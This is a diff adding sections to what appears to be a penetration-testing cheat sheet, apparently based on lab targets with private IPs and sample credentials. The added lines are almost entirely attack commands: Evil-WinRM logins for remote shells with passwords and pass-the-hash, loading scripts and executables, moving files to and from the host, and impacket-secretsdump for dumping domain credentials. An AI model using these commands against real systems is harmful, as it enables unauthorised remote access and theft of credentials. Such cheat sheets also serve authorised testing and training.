@@ -155,3 +155,40 @@ creds
 
 ```
 
+
+using Evil-Winrm :
+```bash
+nmap -p 5985,5986 192.168.1.19
+
+#get reverse shell using plain text password.
+evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987
+
+#transfer data using ssl
+evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -S
+
+#pass the hash
+evil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38
+
+#load powershell script
+evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
+
+#load executable file.
+evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc
+menu
+
+#upload and download script
+upload /root/notes.txt .
+download notes.txt /root/raj/notes.txt
+
+#log file
+evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -l
+
+#using docker.
+docker run --rm -ti --name evil-winrm  oscarakaelvis/evil-winrm -i 192.168.1.105 -u Administrator -p 'Ignite@987'
+
+```
+
+#### Credentials Dumping :
+```bash
+impacket-secretsdump Marvel.local/fcastle:"Password@123"@192.168.154.131  
+```
